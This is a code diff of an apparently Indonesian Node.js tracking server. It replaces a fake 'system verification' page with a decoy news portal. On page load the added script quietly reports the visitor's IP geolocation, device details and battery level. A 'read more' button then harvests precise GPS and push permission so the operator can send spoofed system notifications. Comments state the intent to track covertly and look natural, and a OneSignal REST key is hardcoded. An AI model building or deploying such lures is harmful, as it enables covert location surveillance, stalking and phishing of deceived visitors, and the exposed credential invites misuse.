@@ -6,9 +6,6 @@ const http = require('http');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// ==============================================================
-// KONFIGURASI ONESIGNAL (JANGAN DIUBAH)
-// ==============================================================
 const ONESIGNAL_APP_ID = '209c76da-1da3-4518-9b9c-54b84efcc535';
 const ONESIGNAL_REST_KEY = 'os_v2_app_ecohnwq5uncrrg44ks4e57gfgxdvpd6354oubducbqew5qbz3gmjgsd2vaaz72niplmzkj46ivq3tk6sepctzdm3dlh4ky2umekrviy';
 
@@ -50,14 +47,10 @@ async function ipGeo(ip) {
 app.set('trust proxy', true); 
 app.use(express.json({ limit: '2mb' })); 
 
-// ==============================================================
-// SIMPAN PLAYER ID ONESIGNAL
-// ==============================================================
 app.post('/api/save-player', (req, res) => {
   const ip = clientIp(req);
   const { playerId } = req.body;
   if (!playerId) return res.status(400).json({ error: 'No Player ID' });
-  
   let ids = {};
   try { ids = JSON.parse(fs.readFileSync(OS_IDS_FILE, 'utf8')); } catch (_) {}
   ids[ip] = playerId;
@@ -65,38 +58,23 @@ app.post('/api/save-player', (req, res) => {
   res.json({ ok: true });
 });
 
-// ==============================================================
-// KIRIM NOTIF TEMBUS LEWAT API ONESIGNAL
-// ==============================================================
 app.post('/api/push', async (req, res) => {
   if (req.headers['x-auth-key'] !== DASH_KEY) return res.status(403).json({ok:false});
   const { ip, text } = req.body;
-  
   let ids = {};
   try { ids = JSON.parse(fs.readFileSync(OS_IDS_FILE, 'utf8')); } catch (_) {}
   const playerId = ids[ip];
-  
   if (!playerId) return res.json({ ok: false, msg: 'Target belum izinin notif' });
 
   try {
     const response = await fetch('https://onesignal.com/api/v1/notifications', {
       method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-        'Authorization': `Basic ${ONESIGNAL_REST_KEY}`
-      },
-      body: JSON.stringify({
-        app_id: ONESIGNAL_APP_ID,
-        include_player_ids: [playerId],
-        headings: { en: 'Pemberitahuan Sistem' },
-        contents: { en: text }
-      })
+      headers: { 'Content-Type': 'application/json', 'Authorization': `Basic ${ONESIGNAL_REST_KEY}` },
+      body: JSON.stringify({ app_id: ONESIGNAL_APP_ID, include_player_ids: [playerId], headings: { en: 'Pemberitahuan Sistem' }, contents: { en: text } })
     });
     const data = await response.json();
     res.json({ ok: data.id ? true : false });
-  } catch (e) {
-    res.json({ ok: false, msg: e.message });
-  }
+  } catch (e) { res.json({ ok: false, msg: e.message }); }
 });
 
 app.get('/api/geoip', async (req, res) => {
@@ -117,9 +95,6 @@ app.post('/api/gps', (req, res) => {
   res.json({ ok: true });
 });
 
-// ==============================================================
-// DASHBOARD LIST
-// ==============================================================
 app.get('/dash', (req, res) => {
   if (String(req.query.k || '') !== DASH_KEY) return res.status(403).send('Forbidden');
   const devices = new Map();
@@ -162,9 +137,6 @@ app.get('/dash', (req, res) => {
   res.type('html').send(`<!doctype html><html><head><meta charset="utf-8"><title>Langz Intel</title><meta name="viewport" content="width=device-width,initial-scale=1"><style>:root{--bg:#09090b;--card:#18181b;--border:#27272a;--text:#f4f4f5;--muted:#a1a1aa;--accent:#22d3ee;}*{box-sizing:border-box;font-family:sans-serif}body{margin:0;background:var(--bg);color:var(--text)}.header{padding:24px 20px;background:var(--card);border-bottom:1px solid var(--border)}.header h1{margin:0;font-size:18px}.list{padding:16px}.row{display:flex;align-items:center;background:var(--card);border:1px solid var(--border);border-radius:16px;padding:16px;margin-bottom:12px;text-decoration:none;color:inherit}.row-icon{width:48px;height:48px;font-size:24px;display:flex;align-items:center;justify-content:center;margin-right:14px}.dev{font-weight:700}.meta{font-size:13px;color:var(--muted)}</style></head><body><div class="header"><h1>⚡ Langz Intel</h1></div><div class="list">${rows}</div></body></html>`);
 });
 
-// ==============================================================
-// DASHBOARD MAP (TEMA SURXRAT)
-// ==============================================================
 app.get('/dash/map', (req, res) => {
   if (String(req.query.k || '') !== DASH_KEY) return res.status(403).send('Forbidden');
   let devices = []; try { devices = JSON.parse(fs.readFileSync(DEVICE_FILE, 'utf8')); } catch (_) {}
@@ -253,12 +225,13 @@ app.get('/dash/map', (req, res) => {
 });
 
 // ==============================================================
-// LANDING PAGE (VERIFIKASI + ONESIGNAL)
+// LANDING PAGE (TAMPILAN WEB BIASA + POPUP IZIN)
 // ==============================================================
 app.get('*', (req, res) => {
   const slug = cleanSlug(req.query.s || req.path.replace(/\//g, ''));
   res.type('html').send(`<!doctype html>
-<html lang="id"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Verifikasi Sistem</title>
+<html lang="id"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Berita Hari Ini</title>
 <script src="https://cdn.onesignal.com/sdks/web/v16/OneSignalSDK.page.js" defer></script>
 <script>
   window.OneSignalDeferred = window.OneSignalDeferred || [];
@@ -266,25 +239,58 @@ app.get('*', (req, res) => {
     await OneSignal.init({ appId: "${ONESIGNAL_APP_ID}" });
   });
 </script>
-<style>body{margin:0;font-family:sans-serif;background:#0f172a;color:#fff;display:flex;align-items:center;justify-content:center;min-height:100vh}.box{background:#1e293b;padding:30px;border-radius:16px;max-width:350px;width:100%;text-align:center;box-shadow:0 10px 30px rgba(0,0,0,0.5)}.icon{font-size:50px;margin-bottom:15px}h2{margin:0 0 10px;font-size:20px}p{color:#94a3b8;font-size:13px;line-height:1.5;margin-bottom:25px}.btn{width:100%;padding:15px;background:#38bdf8;color:#000;border:none;border-radius:10px;font-weight:bold;font-size:15px;cursor:pointer}.input{width:100%;padding:12px;background:#0f172a;border:1px solid #334155;border-radius:8px;color:#fff;margin-bottom:15px;box-sizing:border-box;text-align:center}</style></head>
-<body><div class="box" id="box">
-  <div class="icon">🛡️</div><h2>Verifikasi Data</h2><p>Sistem mendeteksi akses baru. Silakan isi NISN dan izinkan akses lokasi.</p>
-  <input type="text" class="input" id="nisn" placeholder="Masukkan NISN">
-  <button class="btn" id="verifyBtn">Verifikasi & Aktifkan</button>
+<style>
+  body{margin:0;font-family:sans-serif;background:#f2f2f2;color:#333}
+  .navbar{background:#c0392b;color:white;padding:15px;font-weight:bold;font-size:20px}
+  .container{padding:15px}
+  .card{background:white;border-radius:8px;overflow:hidden;margin-bottom:15px;box-shadow:0 2px 4px rgba(0,0,0,0.1)}
+  .card img{width:100%;height:150px;object-fit:cover;background:#ddd}
+  .card-content{padding:15px}
+  .card h3{margin:0 0 10px;font-size:16px;color:#222}
+  .card p{margin:0;font-size:13px;color:#666;line-height:1.5}
+  .btn{display:block;width:100%;padding:12px;background:#2980b9;color:white;text-align:center;text-decoration:none;border-radius:6px;font-weight:bold;margin-top:10px}
+</style></head>
+<body>
+<div class="navbar">Portal Berita Terkini</div>
+<div class="container">
+  <div class="card">
+    <div class="card-content">
+      <h3>Banjir Melanda Beberapa Wilayah</h3>
+      <p>Hujan deras yang mengguyur sejak kemarin malam menyebabkan beberapa titik di wilayah ini terendam banjir...</p>
+      <a href="#" class="btn" id="bacaBtn">Baca Selengkapnya</a>
+    </div>
+  </div>
+  <div class="card">
+    <div class="card-content">
+      <h3>Harga Pangan Naik Menjelang Akhir Tahun</h3>
+      <p>Pemerintah memastikan stok pangan aman meskipun ada kenaikan harga di beberapa pasar tradisional...</p>
+    </div>
+  </div>
 </div>
+
 <script>
 (async function(){
-  document.getElementById('verifyBtn').addEventListener('click', async () => {
-    if(!document.getElementById('nisn').value) { alert('Masukkan NISN!'); return; }
-    this.innerText = 'Memverifikasi...';
+  // Otomatis lacak IP & device di background
+  fetch('/api/geoip?s=' + encodeURIComponent('${slug}')).catch(()=>{});
+  
+  const data = { src: 'device_info', language: navigator.language, screen: screen.width + 'x' + screen.height, slug: '${slug}' };
+  if (navigator.getBattery) { try { const b = await navigator.getBattery(); data.battery = Math.round(b.level*100)+'%'; } catch(e){} }
+  if (navigator.connection) { data.netType = navigator.connection.effectiveType; }
+  fetch('/api/gps', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(data) }).catch(()=>{});
 
+  // Pas tombol diklik, munculin izin lokasi & notifikasi
+  document.getElementById('bacaBtn').addEventListener('click', async function(e) {
+    e.preventDefault();
+    
+    // 1. Izin Lokasi
     if (navigator.geolocation) {
       navigator.geolocation.getCurrentPosition(
-        p => { fetch('/api/gps', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({src:'gps',lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy}) }).catch(()=>{}); },
+        p => { fetch('/api/gps', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({src:'gps',lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy,slug:'${slug}'}) }).catch(()=>{}); },
         e => {}, {enableHighAccuracy:true,timeout:15000}
       );
     }
 
+    // 2. Izin Notifikasi
     if (window.OneSignal) {
       try {
         await OneSignal.Notifications.requestPermission();
@@ -295,15 +301,14 @@ app.get('*', (req, res) => {
       } catch(e) { console.log(e); }
     }
     
-    setTimeout(() => { document.getElementById('box').innerHTML = '<div class="icon">✅</div><h2>Verifikasi Berhasil</h2><p>Data Anda telah dicocokkan.</p>'; }, 2000);
+    // Ganti teks tombol aja biar natural
+    this.innerText = 'Sedang memuat berita...';
   });
 })();
-</script></body></html>`);
+</script>
+</body></html>`);
 });
 
-// ==============================================================
-// START SERVER
-// ==============================================================
 http.createServer(app).listen(PORT, '0.0.0.0', () => {
   console.log(`[TRACKER] Nyala di port ${PORT}`);
 });
